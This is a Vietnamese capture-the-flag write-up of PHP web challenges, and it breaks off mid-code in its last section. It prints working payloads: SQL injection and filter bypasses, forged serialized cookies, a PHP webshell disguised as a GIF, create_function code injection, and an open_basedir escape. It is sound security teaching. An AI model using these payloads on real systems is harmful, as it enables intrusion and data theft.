<!-- auto-generated by QWER -->
<script lang="ts">
  /* eslint-disable @typescript-eslint/ban-ts-comment */
  // @ts-nocheck
  import Post from '$lib/layouts/post.svelte';
  import ImgZoom from '$lib/components/image_zoom.svelte';
  import Video from '$lib/components/video.svelte';
  import CodeCopy from '$lib/components/code_copy.svelte';
  import InfoBox from '$lib/components/info_box.svelte';
</script>

<Post>
  <article slot="post_content">
    <h1 id="level01"><a href="#level01">level01</a></h1>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179963339-bc0671f2-f043-4b12-a74a-3fd5ca44348c.png"
        alt="image" />
    </p>
    <p>Sqlite3 có query hoàn toàn có thể thực hiện sqli, fuzz số cột thì biết được có 2 cột</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">1 and 1=0 union select sql,sql from sqlite_master -- '</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179965358-c36348da-ac37-4f0d-891b-e9f4bb468304.png"
        alt="image" />
    </p>
    <p>Có password kìa select nó ra với id 1 nào</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">1 and 1=0 union select password,password from users where id = 1 --'</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179965685-6e109132-1c56-4b00-9b44-291905d404c7.png"
        alt="image" />
    </p>
    <h1 id="level04"><a href="#level04">level04</a></h1>
    <p>Bài cho 2 source code, source thứ nhất có chỗ đáng lưu ý sau</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179966473-82c383f6-4bd9-4dcd-89bf-26e1fca980f9.png"
        alt="image" />
    </p>
    <p>Kiểm tra có cookie và sẽ unserialize cái cookie đấy. Source thứ hai:</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179966371-845ea550-b87f-4913-8972-ad29b77a98eb.png"
        alt="image" />
    </p>
    <p>
      Có function <code class="inline-code-block">SQL_query</code>
      trỏ vào
      <code class="inline-code-block">$query</code>
       có liên kết với source thứ nhất. Với id = 1 thì ta được flag nên giờ chỉ cần select được tới nó là xong, đơn giản
      chỉ cần modify cái cookie thành serialize của class SQL mà trong đó sẽ có query sqli inject thêm từ query có sẵn trong
      source (nhớ base64 nữa).
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-php">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;?php </div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">class SQL {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  public &#36;query = "SELECT username from users where id=1 UNION SELECT password from users where id=1";</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">}</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&#36;a = new SQL();</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">echo base64_encode(serialize(&#36;a));</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">?&gt;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179969680-394dcc22-5173-4012-a1b5-cb43b030e870.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179969719-d132c13e-9a11-4ae4-9857-f609ef502872.png"
        alt="image" />
    </p>
    <h1 id="level17"><a href="#level17">level17</a></h1>
    <p>
      Bài này bắt ta nhập biến <code class="inline-code-block">flag</code>
      sau đó so sánh bằng hàm
      <code class="inline-code-block">strcasecmp</code>
      với $flag có sẵn, nếu ra sai thì sẽ cho flag. Có thể tham khảo hàm
      <code class="inline-code-block">strcasecmp</code>
      tại
      <a href="https://www.php.net/manual/en/function.strcasecmp.php" rel="external">đây</a>
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179970219-15775230-4cbe-489e-a834-6f7d667d9ee1.png"
        alt="image" />
    </p>
    <p>
      Trick để bypass bài này là thay vì nhập $flag là một string thì ta sẽ nhập dưới dạng một array, lúc này kết quả so
      sánh sẽ trả về <code class="inline-code-block">NULL</code>
       (tự debug nha)
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179972273-94a3252b-73b0-4ebb-a7d7-a8e305fa332f.png"
        alt="image" />
    </p>
    <h1 id="level25"><a href="#level25">level25</a></h1>
    <p>Bài này cho nhập vào một trang muốn include. Đọc source lưu ý chỗ như sau</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179972889-c83b046a-89ab-4f7d-b597-87d1db3aea56.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179972913-5c18ef80-d9cb-4ca4-86e5-2f5a71d5666a.png"
        alt="image" />
    </p>
    <p>
      Ban đầu thấy biến <code class="inline-code-block">page</code>
       tưởng chừng path travelsal nhưng ở bước include nó đã thêm .txt vào đuôi rồi nên ta không thể đi theo hướng này.
    </p>
    <p>Phân tích chỗ parse_url(), trước hết ta phải hiểu nó làm gì đã</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179973464-1814f784-657f-4323-89e2-3c1e6647114e.png"
        alt="image" />
    </p>
    <p>
      Vậy thì sau khi parse nó sẽ tạo ra mảng như trên, như trong source code sẽ lấy phần query ra và kiểm tra nếu chứa
      chữ <code class="inline-code-block">flag</code>
       thì sẽ báo lỗi.
    </p>
    <p>
      Ở đây sẽ có nhiều hướng bypass, cách dễ dàng nhất là sử dụng 3 dấu slash, tham khảo thêm ở <a
        href="https://www.php.net/manual/en/function.parse-url.php"
        rel="external">
        đây
      </a>
      và
      <a href="https://blog.birost.com/a?ID=01000-ed462190-b4c0-40c0-84bb-0c96dc4be3fb" rel="external">đây</a>
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179976647-a03f2616-9579-482a-8a44-7de0114a8a16.png"
        alt="image" />
    </p>
    <p>
      Hoặc ta có thể nhập định dạng sai, ở đây mình thêm <code class="inline-code-block">:3</code>
       vào phía sau (tự debug nhé)
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179977161-ad890710-8f82-463a-a880-d90b740826c8.png"
        alt="image" />
    </p>
    <h1 id="level02"><a href="#level02">level02</a></h1>
    <p>
      Bài này giống y hệt level 01, chỉ khác là sử dụng <code class="inline-code-block">preg_replace</code>
       để filter các kí tự cho payload sqli
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179978149-ee531064-0cb0-43e9-a6d8-e417cd8e04d4.png"
        alt="image" />
    </p>
    <p>Bypass chỗ này bằng cách sau</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179978630-983e36d5-e2b7-4da4-876a-22f5fbdc7b8a.png"
        alt="image" />
    </p>
    <p>Payload thì làm i hệt như level 1</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">1 and 1=0 uniunionon seleselectct password,password frofromm users where id=1 -- '</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179978918-23302c26-493c-405a-8256-9d4e5e04902b.png"
        alt="image" />
    </p>
    <h1 id="level08"><a href="#level08">level08</a></h1>
    <p>Bài này cho ta upload một file gif, đoạn code kiểm tra file gif như sau</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180018398-20f7a068-91f5-4732-90cf-96a26cf5ac90.png"
        alt="image" />
    </p>
    <p>
      Ta thấy code có sử dụng <code class="inline-code-block">exif_imagetype</code>
      , sau khi tìm hiểu hàm này trên
      <a href="https://www.php.net/manual/en/function.exif-imagetype.php" rel="external">đây</a>
      thì ta có thể biết rằng hàm chỉ kiểm tra file có phải gif hay không thôi, còn phần body sẽ bị bỏ qua, ta sẽ inject
      một đoạn code php vào phần body này, và sử dụng magic byte để khi đi qua hàm xử lí thì nó sẽ hiểu file này là gif,
      tham khảo magic byte
      <a href="https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198" rel="external">
        này
      </a>
      . Payload file như sau
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">GIF87a</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;?php echo join(" ",scandir('.')); ?&gt;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <em>
        Note: ban đầu mình có thử function để chạy code execution luôn mà không được, hình như các function đã bị chặn
        gần hết, test với payload trên thì được
      </em>
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180021542-cc7d87cf-abcb-4459-9cb5-b662697c7da7.png"
        alt="image" />
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">GIF87a</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;?php echo readfile('flag.txt'); ?&gt;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180022117-f4923ddf-38b8-4a1e-9f80-03ac40721061.png"
        alt="image" />
    </p>
    <h1 id="level15"><a href="#level15">level15</a></h1>
    <p>
      Bài này mới vô cho ta declare hàm nào đó với <code class="inline-code-block">create_function&lpar&rpar</code>
      , source lưu ý
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180024889-b10b1bd5-98a2-4bb1-83a7-089e1f7cac45.png"
        alt="image" />
    </p>
    <p>
      Ban đầu, mình thử nhập như gợi ý là <code class="inline-code-block">echo 1337;</code>
      thôi nhưng mà mình quên
      <code class="inline-code-block">;</code>
       thì web hiện như sau
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180025271-0f0823d2-faf1-4e0e-85bd-e8276ff4dc49.png"
        alt="image" />
    </p>
    <p>
      À há, có nghĩa là ở trước chỗ input này thì lệnh chưa được đóng dấu <code class="inline-code-block">;</code>
      nên dấu
      <code class="inline-code-block">&rcub</code>
       ngay sau đó đã lỗi, vậy thì format theo mình nghĩ sẽ như sau
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;chỗ mình input&gt; } (đoạn code gì đấy phía sau)</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Vậy thì chỉ cần nhập input là <code class="inline-code-block">;&rcub</code>
      để thoát khỏi dấu
      <code class="inline-code-block">&rcub</code>
       sau đó nhập đoạn code mình muốn và comment lại đoạn phía sau là được
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">;} echo 1; //</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180026065-3a61a8e3-8404-4eb8-ae18-7f4af4db4277.png"
        alt="image" />
    </p>
    <p>Oke rồi đọc flag thôi</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">;} echo &#36;flag; //</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180026326-1762cca4-fb67-4cab-a4d3-c6f20b64a835.png"
        alt="image" />
    </p>
    <p>
      Mình có đi tìm thử cách làm khác thì thấy được trang <a
        href="https://www.exploit-db.com/exploits/32417"
        rel="external">
        này
      </a>
      , nghĩa là thằng
      <code class="inline-code-block">create_function</code>
       này đã lỗi sẵn :)), php 8. đã bỏ nó.
    </p>
    <h1 id="level20"><a href="#level20">level20</a></h1>
    <p>
      Thêm một bài serialize rồi gán vào cookie khá giống bài trên nhưng lần này có filter thêm một số kí tự và đặc biệt
      là filter <code class="inline-code-block">O:</code>
      . Mục đích của việc này là để chống khi serialize ra thì sẽ có định dạng O: ở đầu chỉ thị chữ Object. Để bypass
      cái này thì thay vì
      <code class="inline-code-block">O</code>
      , ta có thể dùng
      <code class="inline-code-block">C</code>
      , tham khảo ở
      <a href="https://www.phpinternalsbook.com/php5/classes_objects/serialization.html" rel="external">đây</a>
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180036370-566fcf67-a97c-4bd4-b3aa-bb02c9d17d39.png"
        alt="image" />
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-php">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;?php</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">class Flag {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">}</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&#36;a = new Flag();</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">echo (serialize(&#36;a));</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180038108-11e50f18-7b83-4f4c-8e1f-be06f6e90770.png"
        alt="image" />
    </p>
    <p>
      Sửa lại thành <code class="inline-code-block">C:4:&quot;Flag&quot;:0:&lcub&rcub</code>
       rồi đem đi base64 encode rồi request với cookie với giá trị đó thôi
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180038299-f8a54e8f-d3ed-4f05-a2c3-caa83d27428e.png"
        alt="image" />
    </p>
    <p><em>làm xong bật call me maybe nghe là đúng bài luôn á</em></p>
    <h1 id="level05"><a href="#level05">level05</a></h1>
    <p>
      Bài này cho ta nhập một chuỗi nào đó sau đó <code class="inline-code-block">echo</code>
       ra, source:
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180108461-f7a61dee-b3b6-4a3e-9eb6-c0dcf7783239.png"
        alt="image" />
    </p>
    <p>
      Lệnh echo thực hiện bình thường nên ta có thể echo thử biến được khai báo trong source code để test, thử echo
      $blacklist
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180108967-8f498e66-7034-43ef-ae38-348e627c444c.png"
        alt="image" />
    </p>
    <p>
      Vậy thì từ lệnh echo này ta sẽ cố gắng làm sao để đọc được <code class="inline-code-block">flag.php</code>
      . Ta có thể sử dụng trick sau
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180109136-054ec694-749c-4f25-93ce-a4330a805594.png"
        alt="image" />
    </p>
    <p>
      php treat code trong dấu đô la bằng cách chạy hàm của đoạn code bên trong, ở đây thì đã bị filter dấu ngoặc và <code
        class="inline-code-block">
        &#39;
      </code>
       rồi nên không dùng function chạy code execution được. Tới đây thì ngẫm lại ta đã biết tên file flag là gì rồi nên
      có một cách là ta sẽ include thẳng file flag đó ra luôn là được
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">?q=&#36;{include&#36;_GET[0]}&amp;0=flag.php</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180110169-926c085d-d728-43a4-a486-f32dfdc3b97e.png"
        alt="image" />
    </p>
    <p>402 sao, thế đọc hẳn source code luôn</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">?q=&#36;{include&#36;_GET[0]}&amp;0=php://filter/convert.base64-encode/resource=flag.php</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180110502-73454281-15f9-4ac9-90d0-aa4203d26dd4.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180110520-d16e290f-ab39-4e4b-9248-a9702adb2d1c.png"
        alt="image" />
    </p>
    <h1 id="level22"><a href="#level22">level22</a></h1>
    <p>
      Bài cho ta một service giống <code class="inline-code-block">3v4l.org</code>
       nhưng có filter waf rất nhiều lên input nhập vào
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180118718-e5d59519-db65-41ad-a26d-a48594e53b61.png"
        alt="image" />
    </p>
    <p>
      $blacklist là một mảng chứa những hàm đã bị filter, để ý thêm thì ta thấy phía trên có <code
        class="inline-code-block">
        get_defined_funtions&lpar&rpar
      </code>
       là hàm sẽ get tất cả những hàm có sẵn rồi blacklist sẽ merge thêm những array chứa những hàm bị filter lại. Thay vì
      ngồi tìm cách bypass thì ta ngẫm lại một chút, $blacklist chứa gần như tất cả hàm như thế thì tại sao ta không lấy
      trực tiếp từ nó ra mà sử dụng luôn. Ý tưởng sẽ là như sau
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180113861-28e4f278-9136-41f2-ba80-0b76caad2579.png"
        alt="image" />
    </p>
    <p>
      Từ ý tưởng này thì ta bắt tay vào làm thôi, đầu tiên là ta cần phải biết được vị trí của những hàm ta muốn sử dụng
      từ mảng $blacklist (như hình mình debug trên thì do mình gán sẵn system vào phần tử đầu tiên rồi nên lấy ra chỉ
      cần index 0 thôi). Ta có thể ngồi mò như này:
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180118980-a9be412d-1d65-4b90-bfda-bd8d80b5f0b4.png"
        alt="image" />
    </p>
    <p>
      Hoặc dùng intruder của burp suite rồi filter những hàm mình cần thôi, vì đọc code thấy file flag được include rồi
      sau đó sẽ cho biến <code class="inline-code-block">$a</code>
       xử lí gì với class A gì đó không rõ, nhưng var_dump nó thì được flag
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180120246-db0c6536-f62b-4f5a-a349-ef425520b10c.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180119897-9845d849-6605-4fa3-87b7-e6fd0a2b3fcd.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180119919-dc9361ee-1539-4984-9536-c6479f55a8ad.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180119951-0edfc8bd-0bf4-46b7-8870-161574d2b578.png"
        alt="image" />
    </p>
    <h1 id="level31"><a href="#level31">level31</a></h1>
    <p>
      Bài cho ta có thể nhập một lệnh php nào đó và bảo chúng ta làm sao để đọc <code class="inline-code-block">
        ./flag.php
      </code>
      , đoạn code cần chú ý như sau
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-php">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"> &lt;?php</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">ini_set('open_basedir', '/sandbox');</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">chdir('/sandbox');</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">ini_set('display_errors', 'on');</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">ini_set('error_reporting', E_ALL);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">if (isset (&#36;_GET['c'])) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    die (eval (&#36;_GET['c']));</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">}</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">?&gt;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Ở đây thì basedir là <code class="inline-code-block">/sandbox</code>
      , đọc thử
      <code class="inline-code-block">flag.php</code>
      thì không có trong thư mục hiện tại là
      <code class="inline-code-block">/sandbox</code>
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-php">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">readfile('./flag.php');</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/183091836-ca050ab7-2893-48a0-a9bb-53421c5cebcf.png"
        alt="image" />
    </p>
    <p>
      Như vậy thì file này chỉ có thể là ở directory khác, mà cái <code class="inline-code-block">open_basedir</code>
       thì không cho phép ta truy cập tới thư mục khác được.
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/183092162-5c5bc1cc-9047-430d-a64b-0c3deb9c0757.png"
        alt="image" />
    </p>
    <p>
      Đoạn <code class="inline-code-block">eval</code>
      bên dưới thì chả có gì để nói rồi, nên mục tiêu của ta chỉ là bypass được chỗ
      <code class="inline-code-block">open_basedir</code>
      là xong, mình có tham khảo được bài
      <a href="https://twitter.com/eboda_/status/1113839230608797696" rel="external">này</a>
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/183096618-32fd74f6-f1f9-4c3e-99d1-f91f35844b4d.png"
        alt="image" />
    </p>
    <p>
      Sử dụng nó thử nào, giờ ta phải tìm được sub-directory của <code class="inline-code-block">/sandbox</code>
       đã, cái này thì dễ rồi
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-php">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">print_r(scandir('.'));</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/183096929-6abdc4e5-c9b3-419a-bbc7-a802b3ef8d22.png"
        alt="image" />
    </p>
    <p>
      Là <code class="inline-code-block">tmp</code>
      , hoàn thiện payload thôi:
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-php">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">chdir('tmp'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); chdir('..'); ini_set('open_basedir','/'); readfile('/flag.php');</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/183097086-9a69eb04-25af-4e65-b562-aa73a7853dbf.png"
        alt="image" />
    </p>
    <h1 id="level24"><a href="#level24">level24</a></h1>
    <p>
      Đề bài cho ta tạo file bằng cách nhập tên file rồi sau đó cho điều chỉnh content của file, cuối cùng là lưu vào <code
        class="inline-code-block">
        /upload/&lt;cái gì đấy&gt;/&lt;tên file&gt;
      </code>
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-php">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;?php</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">ini_set('display_errors', 'on');</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">ini_set('error_reporting', E_ALL);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">session_start();</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">include 'clean_up.php';</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">/* periodic cleanup */</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">foreach (glob("./uploads/*") as &#36;file) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    if (is_file(&#36;file)) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        unlink(&#36;file);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    } else {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        if (time() - filemtime(&#36;file) &gt;= 60 * 60 * 24 * 7) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">            Delete(&#36;file);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        }</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    }</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">}</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&#36;upload_dir = sprintf("./uploads/%s/", session_id());</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">@mkdir(&#36;upload_dir, 0755, true);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">/* sandboxing ! */</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">chdir(&#36;upload_dir);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">ini_set('open_basedir', '.');</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&#36;p = "list";</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&#36;data = "";</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&#36;filename = "";</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">if (isset(&#36;_GET['p']) &amp;&amp; isset(&#36;_GET['filename']) ) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &#36;filename = &#36;_GET['filename'];</div></div><div class="code-line"><div class="code-linenotation"><span 